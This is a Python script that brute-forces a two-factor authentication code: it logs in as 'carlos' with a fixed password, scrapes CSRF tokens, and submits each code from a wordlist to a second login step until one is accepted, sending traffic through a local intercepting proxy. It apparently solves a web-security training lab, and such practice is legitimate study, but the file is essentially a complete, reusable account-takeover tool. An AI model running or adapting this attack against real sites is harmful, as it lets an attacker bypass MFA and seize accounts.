from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

s=requests.Session()

def main():

    try:
        url=sys.argv[1].strip()
        otps_list=sys.argv[2].strip()
        brute_otp(s,url,otps_list)
    except IndexError:
        print('[-] Missing Parameters ')
        print('[*] Usage python %s <url> usernames passwords'%sys.argv[0])
        sys.exit()
def brute_otp(s,url,otps_list):
    
    
    try:
        with open(otps_list) as otps:
            for otp in otps:
                otp=otp.strip()
                r=s.get(url+"login",verify=False,proxies=proxies)
                soup=BeautifulSoup(r.text,'html.parser')
                csrf=soup.find("input")["value"]
                data={'username':'carlos','password':'montoya','csrf':csrf}
                s.post(url+"login",verify=False,data=data,proxies=proxies,allow_redirects=False)
                r=s.get(url+"login2",verify=False,proxies=proxies)
                soup=BeautifulSoup(r.text,'html.parser')
                csrf=soup.find("input")["value"]
                data={'mfa-code':otp,'csrf':csrf}
                r=s.post(url+"login2",data=data,allow_redirects=False,verify=False,proxies=proxies)
                
                if 'Incorrect security code' not in r.text:
                    print("[+] Found valid OTP : "+str(otp)+" : Response Code : "+str(r.status_code))
                    r=s.get(url+"my-account",verify=False,proxies=proxies)
                    break
                
    
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt,Quitting the Program")
        sys.exit()
    except TypeError:
        print('[+] Data Type concatenation mismatch')
        sys.exit()
    except :
        print("[-] Invalid Users file ")
        sys.exit(0)


if __name__=="__main__":
    main()